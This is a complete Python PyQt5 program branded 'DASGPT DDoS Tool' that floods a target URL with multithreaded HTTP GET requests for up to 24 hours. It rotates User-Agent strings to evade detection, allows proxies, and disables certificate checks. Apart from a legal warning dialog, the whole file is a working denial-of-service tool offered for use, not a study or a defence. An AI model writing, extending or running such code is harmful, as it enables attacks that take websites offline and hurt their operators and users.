import sys
import threading
import time
import random
from urllib.parse import urlparse

# PyQt5 imports
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit, QHBoxLayout, QComboBox,
    QProgressBar
)
from PyQt5.QtGui import QPalette, QColor, QIcon
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer

# Import requests for HTTP flooding
try:
    import requests
    requests.packages.urllib3.disable_warnings() # Suppress SSL warnings for self-signed or invalid certs
except ImportError:
    QMessageBox.critical(None, "Import Error", "The 'requests' library is not installed.\nPlease run 'pip install requests' in your terminal.")
    sys.exit(1)

# --- DDoS Core Logic ---

# Global control flags and counters
ATTACK_RUNNING = False
REQUESTS_SENT = 0
ERRORS_COUNT = 0
START_TIME = 0

# Lock for updating shared counters safely across threads
counter_lock = threading.Lock()

# User-Agent rotation for basic obfuscation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/102.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
]

def attack_worker(target_url, log_signal, timeout=10, proxy=None):
    """Worker function for each thread to send requests."""
    global ATTACK_RUNNING, REQUESTS_SENT, ERRORS_COUNT

    session = requests.Session() # Use a session for potential connection reuse
    session.verify = False # Ignore SSL certificate verification issues (common in testing)
    
    while ATTACK_RUNNING:
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            proxies = {'http': proxy, 'https': proxy} if proxy else None

            response = session.get(target_url, headers=headers, timeout=timeout, proxies=proxies, allow_redirects=True)
            
            with counter_lock:
                global REQUESTS_SENT
                REQUESTS_SENT += 1
                if response.status_code >= 400: # Log HTTP errors
                    log_signal.emit(f"[ERROR] {target_url} - Status: {response.status_code}")
                    ERRORS_COUNT += 1
                else:
                    log_signal.emit(f"[SUCCESS] {target_url} - Status: {response.status_code}")

        except requests.exceptions.RequestException as e:
            with counter_lock:
                log_signal.emit(f"[ERROR] {target_url} - {e}")
                ERRORS_COUNT += 1
        except Exception as e:
            with counter_lock:
                log_signal.emit(f"[CRITICAL ERROR] {e}")
                ERRORS_COUNT += 1
        
        # Small delay to prevent 100% CPU usage on client or to simulate human behavior
        time.sleep(random.uniform(0.01, 0.1)) # Random sleep between 10ms and 100ms

# --- PyQt5 GUI Application ---

class DDoSAttackThread(QThread):
    """Custom QThread to run the DDoS attack workers."""
    log_signal = pyqtSignal(str) # Signal for logging messages to the GUI
    update_counts_signal = pyqtSignal(int, int, float) # Signal for updating request/error counts

    def __init__(self, target_url, num_threads, duration_seconds=86400, parent=None):
        super().__init__(parent)
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration_seconds = duration_seconds
        self.threads = []

    def run(self):
        global ATTACK_RUNNING, REQUESTS_SENT, ERRORS_COUNT, START_TIME
        ATTACK_RUNNING = True
        REQUESTS_SENT = 0
        ERRORS_COUNT = 0
        START_TIME = time.time()

        self.log_signal.emit(f"Starting attack on {self.target_url} with {self.num_threads} threads...")
        self.log_signal.emit(f"Max duration: {self.duration_seconds / 3600:.2f} hours")

        for _ in range(self.num_threads):
            thread = threading.Thread(target=attack_worker, args=(self.target_url, self.log_signal))
            thread.daemon = True # Allow main program to exit even if threads are running
            self.threads.append(thread)
            thread.start()

        end_time = START_TIME + self.duration_seconds
        while ATTACK_RUNNING and time.time() < end_time:
            time.sleep(1) # Update every second
            with counter_lock:
                elapsed_time = time.time() - START_TIME
                self.update_counts_signal.emit(REQUESTS_SENT, ERRORS_COUNT, elapsed_time)
            
            # Check if attack was stopped from GUI
            if not ATTACK_RUNNING:
                break
        
        self.stop_attack()
        self.log_signal.emit("Attack duration limit reached or stopped.")
        self.update_counts_signal.emit(REQUESTS_SENT, ERRORS_COUNT, time.time() - START_TIME)


    def stop_attack(self):
        global ATTACK_RUNNING
        ATTACK_RUNNING = False
        # No need to explicitly join threads marked as daemon=True, they will exit with main program.
        # However, for a clean shutdown, one might wait for them, but for this DDoS tool,
        # immediate exit is often desired.

class DDoSGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DASGPT DDoS Tool")
        self.setGeometry(100, 100, 800, 650) # x, y, width, height
        self.setWindowIcon(QIcon("icon.png")) # Optional: provide a simple icon.png
        
        # Ensure high DPI scaling for crisp display on high-res monitors
        QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
        QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)
        QApplication.setStyle("Fusion") # Apply a modern style

        self.attack_thread = None
        self.init_ui()
        self.apply_dark_theme()

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        main_layout = QVBoxLayout()
        central_widget.setLayout(main_layout)

        # Title Label
        title_label = QLabel("<h1>DASGPT DDoS Attack Orchestrator</h1>")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: #FF5733;") # Orange-red color
        main_layout.addWidget(title_label)

        # Target URL/IP
        target_layout = QHBoxLayout()
        target_label = QLabel("Target URL/IP:")
        self.target_input = QLineEdit("http://example.com") # Default target for testing
        self.target_input.setPlaceholderText("e.g., http://target.com or 192.168.1.1")
        target_layout.addWidget(target_label)
        target_layout.addWidget(self.target_input)
        main_layout.addLayout(target_layout)

        # Threads and Duration
        settings_layout = QHBoxLayout()
        threads_label = QLabel("Threads:")
        self.threads_input = QLineEdit("500") # Default threads
        self.threads_input.setPlaceholderText("Number of concurrent threads")
        
        duration_label = QLabel("Duration (hours):")
        self.duration_input = QLineEdit("1") # Default 1 hour
        self.duration_input.setPlaceholderText("Max attack duration in hours (e.g., 24 for 1 day)")

        settings_layout.addWidget(threads_label)
        settings_layout.addWidget(self.threads_input)
        settings_layout.addWidget(duration_label)
        settings_layout.addWidget(self.duration_input)
        main_layout.addLayout(settings_layout)

        # Control Buttons
        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.start_button.clicked.connect(self.start_attack)
        self.start_button.setStyleSheet(
            "QPushButton { background-color: #28a745; color: white; padding: 10px; border-radius: 5px; }"
            "QPushButton:hover { background-color: #218838; }"
        )
        
        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False) # Disabled until attack starts
        self.stop_button.setStyleSheet(
            "QPushButton { background-color: #dc3545; color: white; padding: 10px; border-radius: 5px; }"
            "QPushButton:hover { background-color: #c82333; }"
        )

        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        main_layout.addLayout(button_layout)

        # Status Display
        status_label = QLabel("Attack Status:")
        main_layout.addWidget(status_label)

        stats_layout = QHBoxLayout()
        self.requests_label = QLabel("Requests Sent: 0")
        self.errors_label = QLabel("Errors: 0")
        self.time_label = QLabel("Time Elapsed: 0s")
        stats_layout.addWidget(self.requests_label)
        stats_layout.addWidget(self.errors_label)
        stats_layout.addWidget(self.time_label)
        main_layout.addLayout(stats_layout)
        
        # Log Output
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setPlaceholderText("Attack logs will appear here...")
        main_layout.addWidget(self.log_output)

        # Clear Log Button
        clear_log_button = QPushButton("Clear Log")
        clear_log_button.clicked.connect(self.log_output.clear)
        clear_log_button.setStyleSheet(
            "QPushButton { background-color: #6c757d; color: white; padding: 5px; border-radius: 3px; }"
            "QPushButton:hover { background-color: #5a6268; }"
        )
        main_layout.addWidget(clear_log_button)

    def log_message(self, message):
        """Appends a message to the log output."""
        self.log_output.append(message)
        self.log_output.verticalScrollBar().setValue(self.log_output.verticalScrollBar().maximum())

    def update_counts(self, requests_sent, errors_count, elapsed_seconds):
        """Updates the requests and errors labels."""
        self.requests_label.setText(f"Requests Sent: {requests_sent:,}")
        self.errors_label.setText(f"Errors: {errors_count:,}")
        
        hours = int(elapsed_seconds // 3600)
        minutes = int((elapsed_seconds % 3600) // 60)
        seconds = int(elapsed_seconds % 60)
        self.time_label.setText(f"Time Elapsed: {hours:02}:{minutes:02}:{seconds:02}")

    def start_attack(self):
        target = self.target_input.text().strip()
        threads_str = self.threads_input.text().strip()
        duration_str = self.duration_input.text().strip()

        if not target:
            QMessageBox.warning(self, "Input Error", "Please enter a target URL or IP.")
            return

        try:
            num_threads = int(threads_str)
            if num_threads <= 0:
                raise ValueError("Number of threads must be positive.")
        except ValueError:
            QMessageBox.warning(self, "Input Error", "Invalid number of threads. Please enter a positive integer.")
            return

        try:
            duration_hours = float(duration_str)
            if duration_hours <= 0 or duration_hours > 24:
                raise ValueError("Duration must be between 0 and 24 hours.")
            duration_seconds = int(duration_hours * 3600) # Convert hours to seconds
        except ValueError:
            QMessageBox.warning(self, "Input Error", "Invalid duration. Please enter a number between 0 and 24.")
            return
            
        # Basic URL validation
        try:
            parsed_url = urlparse(target)
            if not parsed_url.scheme: # If no scheme, default to http
                target = "http://" + target
                self.target_input.setText(target) # Update input field
            elif parsed_url.scheme not in ['http', 'https']:
                QMessageBox.warning(self, "Input Error", "Unsupported URL scheme. Please use http:// or https://")
                return
        except Exception:
            QMessageBox.warning(self, "Input Error", "Invalid target URL format.")
            return

        # Confirmation dialog for dangerous operation
        confirm_dialog = QMessageBox()
        confirm_dialog.setIcon(QMessageBox.Warning)
        confirm_dialog.setText("DANGER: Initiating a DDoS attack can be illegal and harmful.")
        confirm_dialog.setInformativeText(f"Are you absolutely sure you want to attack: <b>{target}</b>\n\nThis action can have severe legal consequences if unauthorized.")
        confirm_dialog.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
        confirm_dialog.setDefaultButton(QMessageBox.No)
        ret = confirm_dialog.exec_()

        if ret == QMessageBox.No:
            self.log_message("Attack initiation cancelled by user.")
            return

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.target_input.setReadOnly(True)
        self.threads_input.setReadOnly(True)
        self.duration_input.setReadOnly(True)
        self.log_output.clear()
        self.requests_label.setText("Requests Sent: 0")
        self.errors_label.setText("Errors: 0")
        self.time_label.setText("Time Elapsed: 0s")
        
        self.attack_thread = DDoSAttackThread(target, num_threads, duration_seconds)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.update_counts_signal.connect(self.update_counts)
        self.attack_thread.finished.connect(self.on_attack_finished) # Connect to a slot that re-enables buttons
        self.attack_thread.start()
        self.log_message(f"Attack started on {target} with {num_threads} threads for {duration_hours} hours.")

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop_attack()
            self.log_message("Stopping attack...")
            self.start_button.setEnabled(False) # Keep disabled until fully stopped
            self.stop_button.setEnabled(False)
            
    def on_attack_finished(self):
        """Slot called when the attack thread finishes."""
        self.log_message("Attack process concluded.")
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.target_input.setReadOnly(False)
        self.threads_input.setReadOnly(False)
        self.duration_input.setReadOnly(False)

    def apply_dark_theme(self):
        """Applies a dark theme to the application."""
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(53, 53, 53))
        palette.setColor(QPalette.WindowText, QColor(255, 255, 255))
        palette.setColor(QPalette.Base, QColor(25, 25, 25))
        palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        palette.setColor(QPalette.ToolTipBase, QColor(255, 255, 255))
        palette.setColor(QPalette.ToolTipText, QColor(255, 255, 255))
        palette.setColor(QPalette.Text, QColor(255, 255, 255))
        palette.setColor(QPalette.Button, QColor(53, 53, 53))
        palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        palette.setColor(QPalette.BrightText, QColor(255, 0, 0))
        palette.setColor(QPalette.Link, QColor(42, 130, 218))
        palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        palette.setColor(QPalette.HighlightedText, QColor(0, 0, 0))
        self.setPalette(palette)
        
        # Apply style sheet for specific widgets not fully covered by palette
        self.setStyleSheet("""
            QMainWindow { background-color: #353535; }
            QLabel { color: #ADD8E6; } /* Light Blue for general labels */
            QLineEdit { 
                background-color: #202020; 
                color: #FFFFFF; 
                border: 1px solid #4CAF50; /* Green border */
                padding: 5px; 
            }
            QTextEdit { 
                background-color: #202020; 
                color: #FFFFFF; 
                border: 1px solid #4CAF50; 
                padding: 5px; 
            }
            QPushButton { 
                border: none; 
                padding: 8px; 
                border-radius: 4px; 
            }
            /* Specific button styles are set inline in init_ui */
            QComboBox {
                background-color: #202020;
                color: #FFFFFF;
                border: 1px solid #4CAF50;
                padding: 3px;
                border-radius: 3px;
            }
            QComboBox::drop-down {
                border: 0px; 
            }
            QComboBox QAbstractItemView {
                background-color: #202020;
                color: #FFFFFF;
                selection-background-color: #4CAF50;
            }
        """)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = DDoSGUI()
    window.show()
    sys.exit(app.exec_())
